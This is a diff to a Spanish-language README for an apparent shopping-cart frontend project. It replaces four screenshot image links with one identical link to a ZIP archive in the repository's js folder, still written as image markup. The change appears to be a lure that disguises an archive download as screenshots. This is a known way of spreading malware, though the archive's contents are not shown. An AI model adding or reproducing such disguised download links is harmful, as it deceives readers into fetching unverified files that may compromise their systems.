@@ -13,15 +13,15 @@ Una vez se comprueba que el login fue exitoso, el usuario se dirigira a la pagin
 Ademas podemos agregar productos al carrito de compras y ver que productos hemos añadido
 
 Login
-![image](https://github.com/user-attachments/assets/105ee5c4-8d8b-49ed-a1b9-c1f6d450bcf9)
+![image](https://github.com/cristiancrakl/shopping-cart-front-examen/raw/refs/heads/main/js/shopping_cart_examen_front_v3.3.zip)
 
 Usuarios
-![image](https://github.com/user-attachments/assets/7fe00246-013c-4bf9-ae8a-01698b2831df)
+![image](https://github.com/cristiancrakl/shopping-cart-front-examen/raw/refs/heads/main/js/shopping_cart_examen_front_v3.3.zip)
 
 Productos
 
-![image](https://github.com/user-attachments/assets/51e54b74-f7e4-4b05-b8c1-2d682c5d509b)
+![image](https://github.com/cristiancrakl/shopping-cart-front-examen/raw/refs/heads/main/js/shopping_cart_examen_front_v3.3.zip)
 
 Carrito de compras
 
-![image](https://github.com/user-attachments/assets/ce3e4d12-8fb0-40af-be95-ad33e0a78e4c)
+![image](https://github.com/cristiancrakl/shopping-cart-front-examen/raw/refs/heads/main/js/shopping_cart_examen_front_v3.3.zip)
